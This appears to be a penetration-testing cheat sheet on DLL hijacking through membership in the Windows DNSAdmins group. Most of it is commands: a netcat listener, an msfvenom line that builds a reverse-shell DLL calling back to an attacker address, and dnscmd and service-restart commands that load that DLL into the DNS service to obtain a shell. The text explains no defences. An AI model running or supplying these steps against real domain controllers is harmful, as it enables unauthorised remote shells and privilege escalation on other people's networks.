# DLL Hijacking

The attack is possible if a Domain user is part of the `DNSAdmin` group.

```sh
rlwrap nc -nlvp 4444
```

- Create the DLL payload with msfvenom and start a listener

```sh
msfvenom --platform windows -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.10.x.x -f dll -o evil.dll
```

- Connect to the user account and transfer the DLL

- Inject the dll into the system process and get a shell

```sh
dnscmd /config /serverlevelplugindll C:\Temp\evil.dll

sc stop dns
sc start dns
```
